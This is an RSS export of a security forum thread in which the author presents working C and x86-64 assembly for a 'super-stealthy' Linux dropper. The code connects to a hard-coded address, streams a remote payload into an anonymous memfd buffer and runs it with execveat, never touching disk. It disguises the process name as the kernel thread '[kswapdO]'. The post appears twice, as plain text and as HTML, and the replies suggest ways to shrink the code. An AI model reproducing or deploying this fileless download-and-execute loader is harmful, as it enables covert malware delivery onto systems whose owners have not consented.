<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Super-Stealthy Droppers (Updated)</title>
    <link>https://0x00sec.org/t/super-stealthy-droppers-updated/35345</link>
    <description>In the original [post](https://0x00sec.org/t/super-stealthy-droppers/3715), I described how to use `memfd_create` and `fexecve` to download a program into memory and run it from there. The post also provided some alternatives in case, either `memfd_create` or `fexecve` were not available.

For the alternative implementation of `fexecve` I used the trick to get a path to a file descriptor using `/proc/PID/fd/NN`. That is perfectly fine, however, you may run in two problems when using that technique:

* First, the system may not have a `/proc` pseudo filesystem. Even when this is rare nowadays, it may happen, specially when dealing with embedded platforms.
* Second, implementing that technique in assembler is a pain in the ass. Believe it or not, printing a decimal number requires quite some code.

So. it is good to keep some tricks under your sleeve.

# Introducing `execveat`

`execveat` is a system call introduced on kernel 3.19, so it is relatively recent. Actually, it is more recent than `memfd_create` which was introduced on kernel 3.17.... No, I do not have a prodigious  memory... that information is in the man pages for both system calls :slight_smile: 

Actually, `fexecve` man page provides the details on how to proceed when no `/proc` filesystem is available, and tell us that, in such cases, `execveat` is used. As a side note, some times people ask for  books and resources to learn, so... there you go, the man pages are full of very juicy information. Read them, specially the final sections where `NOTES` and `BUGS` are described.

So, let&#39;s rewrite our dropper using this &quot;_new_&quot; system call.

```c
int main (int argc, char **argv, char **env) {
  int                fd, s, l;
  unsigned long      addr = 0x0100007f11110002;
  char               *args[2]= {&quot;[kswapdO]&quot;, NULL};
  char               buf[1024];

  s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP);
  connect (s, (struct sockaddr*)&amp;addr, 16);
  fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC);

  while (1) {
      l = read (s, buf, 1024);
      if (write (fd, buf, l) &lt; 1024) break;
    }
  close (s);

  execveat (fd, &quot;&quot;, args, env, AT_EMPTY_PATH);
  
  return 0;
}
```

The code doesn&#39;t look that different when compared to the original one. We have just changed the call to `fexecve` into a call to `execveat`. Source code-wise we have not gain much.... same number of instructions, however, the big difference is that `fexecve` is a function that implies much more code that just invoking `execveat` which is a single system call. Actually, `fexecve` when using the `/proc` file system, requires two system calls as well as the code to print the PID in decimal...

Back to our new code, in order to use `execveat` to run a program using just its file descriptor, we have to provide the `AT_EMPTY_PATH` flag (flags are provided as the fourth argument). This flag says the system call that the path argument (2nd argument) will be an empty string and the system call should only use the file descriptor provided as first argument.

For the rest of the program you may read [this](https://0x00sec.org/t/programming-for-wannabes-part-v-a-dropper/23090) or [this](https://0x00sec.org/t/super-stealthy-droppers/3715) in case there is some part that you do not understand (of course, you can also drop your question in comments down below).

# Bonus
This was a too short post, so let&#39;s include an assembler version of the program. This is specially simple because the program, as it is now, is just a bunch of system calls invoked one after the other:

```asm:x86
section .text
global _start

_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 ; Read buffer + Socket + size

	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6      ; IPPROTO_TCP
	mov rax, 41     ; socket
	syscall
	
	mov r12, rax    ; Save socket on r12 for later

	;; memfd_create (&quot;a&quot;, 1)
	lea rdi, [rel fname]
	mov rsi, 1
	mov rax, 319       ; memfd_create
	syscall
	mov r13, rax		; Save fd in R13 for later

 	mov rdi, r12
	lea rsi, [rel addr]
	mov rdx, 16
	mov rax, 42   ; Connect !
	syscall

	lea rsi, [rbp]
l0:				
	;; _read (s = r12, rdi, 1024);
	mov rdi, r12
	mov rdx, 1024
	mov rax, 0  ; read
	syscall

	;; _write (fd = r13, rdi, result of read)
	mov rdi, r13
	mov rdx, rax
	mov rax, 1  ; write
	syscall
	cmp eax, 1024
	jl done
	jmp l0
	
done:
	mov rdi, r12
	mov rax, 3 ; close
	syscall

	mov rdi, r13
	lea rsi, [rel fname + 1]
	xor rdx, rdx
	xor r10, r10
	mov r8, 0x1000
	mov rax, 322; execat
	syscall
	
	addr    dq 0x0100007f11110002
	fname   db &quot;a&quot;,0
```

There are only two comments regarding this code:
* The frame pointer at the beginning of the code can be removed. It is an artefact from a previous post . For a program as simple as this, it is better to just use the available registers and we do not really need to create a stack frame as there is no function call involved.... Just use the stack as buffer when needed.
* The second parameter to `execveat` is a null string. Note that we just reuse the name passed to `memfd_create` but we increase the pointer 1 byte so it points to the ending zero... That is a NULL string in assembler.

This version is around 350 bytes, but I bet it can be reduced even more. If you manage to get it under 300 let me know ;)</description>
    
    <lastBuildDate>Tue, 22 Aug 2023 00:05:51 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/super-stealthy-droppers-updated/35345.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Super-Stealthy Droppers (Updated)</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/super-stealthy-droppers-updated/35345/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/super-stealthy-droppers-updated/35345/5</link>
        <pubDate>Mon, 02 Oct 2023 07:03:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-35345-5</guid>
        <source url="https://0x00sec.org/t/super-stealthy-droppers-updated/35345.rss">Super-Stealthy Droppers (Updated)</source>
      </item>
      <item>
        <title>Super-Stealthy Droppers (Updated)</title>
        <dc:creator><![CDATA[21232f297a57a5a74389]]></dc:creator>
        <description><![CDATA[
            <p>Nice to read your post  sir, after quite long time <img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=12" title=":heart:" class="emoji" alt=":heart:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/super-stealthy-droppers-updated/35345/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/super-stealthy-droppers-updated/35345/3</link>
        <pubDate>Sat, 03 Jun 2023 01:56:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-35345-3</guid>
        <source url="https://0x00sec.org/t/super-stealthy-droppers-updated/35345.rss">Super-Stealthy Droppers (Updated)</source>
      </item>
      <item>
        <title>Super-Stealthy Droppers (Updated)</title>
        <dc:creator><![CDATA[messede]]></dc:creator>
        <description><![CDATA[
            <p><strike>When i saw the read and write loop, i immediately remembered sendfile(2), maybe that could save us a few bytes ?.</strike></p>
<p>Was nice reading your post after quite some time <img src="https://0x00sec.org/images/emoji/twitter/grinning.png?v=12" title=":grinning:" class="emoji" alt=":grinning:" loading="lazy" width="20" height="20"></p>
<p>Update: sendfile(2) doesnt accept socket for in_fd, so we cannot do what i suggested above, damn i have to read those man pages more often!. Also wish there was something like receivefile().</p>
          <p><a href="https://0x00sec.org/t/super-stealthy-droppers-updated/35345/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/super-stealthy-droppers-updated/35345/2</link>
        <pubDate>Fri, 02 Jun 2023 17:37:33 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-35345-2</guid>
        <source url="https://0x00sec.org/t/super-stealthy-droppers-updated/35345.rss">Super-Stealthy Droppers (Updated)</source>
      </item>
      <item>
        <title>Super-Stealthy Droppers (Updated)</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>In the original <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">post</a>, I described how to use <code>memfd_create</code> and <code>fexecve</code> to download a program into memory and run it from there. The post also provided some alternatives in case, either <code>memfd_create</code> or <code>fexecve</code> were not available.</p>
<p>For the alternative implementation of <code>fexecve</code> I used the trick to get a path to a file descriptor using <code>/proc/PID/fd/NN</code>. That is perfectly fine, however, you may run in two problems when using that technique:</p>
<ul>
<li>First, the system may not have a <code>/proc</code> pseudo filesystem. Even when this is rare nowadays, it may happen, specially when dealing with embedded platforms.</li>
<li>Second, implementing that technique in assembler is a pain in the ass. Believe it or not, printing a decimal number requires quite some code.</li>
</ul>
<p>So. it is good to keep some tricks under your sleeve.</p>
<h1>
<a name="introducing-execveat-1" class="anchor" href="https://0x00sec.org#introducing-execveat-1"></a>Introducing <code>execveat</code>
</h1>
<p><code>execveat</code> is a system call introduced on kernel 3.19, so it is relatively recent. Actually, it is more recent than <code>memfd_create</code> which was introduced on kernel 3.17… No, I do not have a prodigious  memory… that information is in the man pages for both system calls <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<p>Actually, <code>fexecve</code> man page provides the details on how to proceed when no <code>/proc</code> filesystem is available, and tell us that, in such cases, <code>execveat</code> is used. As a side note, some times people ask for  books and resources to learn, so… there you go, the man pages are full of very juicy information. Read them, specially the final sections where <code>NOTES</code> and <code>BUGS</code> are described.</p>
<p>So, let’s rewrite our dropper using this “<em>new</em>” system call.</p>
<pre><code class="lang-c">int main (int argc, char **argv, char **env) {
  int                fd, s, l;
  unsigned long      addr = 0x0100007f11110002;
  char               *args[2]= {"[kswapdO]", NULL};
  char               buf[1024];

  s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP);
  connect (s, (struct sockaddr*)&amp;addr, 16);
  fd = memfd_create("a", MFD_CLOEXEC);

  while (1) {
      l = read (s, buf, 1024);
      if (write (fd, buf, l) &lt; 1024) break;
    }
  close (s);

  execveat (fd, "", args, env, AT_EMPTY_PATH);
  
  return 0;
}
</code></pre>
<p>The code doesn’t look that different when compared to the original one. We have just changed the call to <code>fexecve</code> into a call to <code>execveat</code>. Source code-wise we have not gain much… same number of instructions, however, the big difference is that <code>fexecve</code> is a function that implies much more code that just invoking <code>execveat</code> which is a single system call. Actually, <code>fexecve</code> when using the <code>/proc</code> file system, requires two system calls as well as the code to print the PID in decimal…</p>
<p>Back to our new code, in order to use <code>execveat</code> to run a program using just its file descriptor, we have to provide the <code>AT_EMPTY_PATH</code> flag (flags are provided as the fourth argument). This flag says the system call that the path argument (2nd argument) will be an empty string and the system call should only use the file descriptor provided as first argument.</p>
<p>For the rest of the program you may read <a href="https://0x00sec.org/t/programming-for-wannabes-part-v-a-dropper/23090">this</a> or <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">this</a> in case there is some part that you do not understand (of course, you can also drop your question in comments down below).</p>
<h1>
<a name="bonus-2" class="anchor" href="https://0x00sec.org#bonus-2"></a>Bonus</h1>
<p>This was a too short post, so let’s include an assembler version of the program. This is specially simple because the program, as it is now, is just a bunch of system calls invoked one after the other:</p>
<pre><code class="lang-auto">section .text
global _start

_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 ; Read buffer + Socket + size

	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6      ; IPPROTO_TCP
	mov rax, 41     ; socket
	syscall
	
	mov r12, rax    ; Save socket on r12 for later

	;; memfd_create ("a", 1)
	lea rdi, [rel fname]
	mov rsi, 1
	mov rax, 319       ; memfd_create
	syscall
	mov r13, rax		; Save fd in R13 for later

 	mov rdi, r12
	lea rsi, [rel addr]
	mov rdx, 16
	mov rax, 42   ; Connect !
	syscall

	lea rsi, [rbp]
l0:				
	;; _read (s = r12, rdi, 1024);
	mov rdi, r12
	mov rdx, 1024
	mov rax, 0  ; read
	syscall

	;; _write (fd = r13, rdi, result of read)
	mov rdi, r13
	mov rdx, rax
	mov rax, 1  ; write
	syscall
	cmp eax, 1024
	jl done
	jmp l0
	
done:
	mov rdi, r12
	mov rax, 3 ; close
	syscall

	mov rdi, r13
	lea rsi, [rel fname + 1]
	xor rdx, rdx
	xor r10, r10
	mov r8, 0x1000
	mov rax, 322; execat
	syscall
	
	addr    dq 0x0100007f11110002
	fname   db "a",0
</code></pre>
<p>There are only two comments regarding this code:</p>
<ul>
<li>The frame pointer at the beginning of the code can be removed. It is an artefact from a previous post . For a program as simple as this, it is better to just use the available registers and we do not really need to create a stack frame as there is no function call involved… Just use the stack as buffer when needed.</li>
<li>The second parameter to <code>execveat</code> is a null string. Note that we just reuse the name passed to <code>memfd_create</code> but we increase the pointer 1 byte so it points to the ending zero… That is a NULL string in assembler.</li>
</ul>
<p>This version is around 350 bytes, but I bet it can be reduced even more. If you manage to get it under 300 let me know <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=12" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/super-stealthy-droppers-updated/35345/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/super-stealthy-droppers-updated/35345/1</link>
        <pubDate>Fri, 02 Jun 2023 15:02:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-35345-1</guid>
        <source url="https://0x00sec.org/t/super-stealthy-droppers-updated/35345.rss">Super-Stealthy Droppers (Updated)</source>
      </item>
  </channel>
</rss>
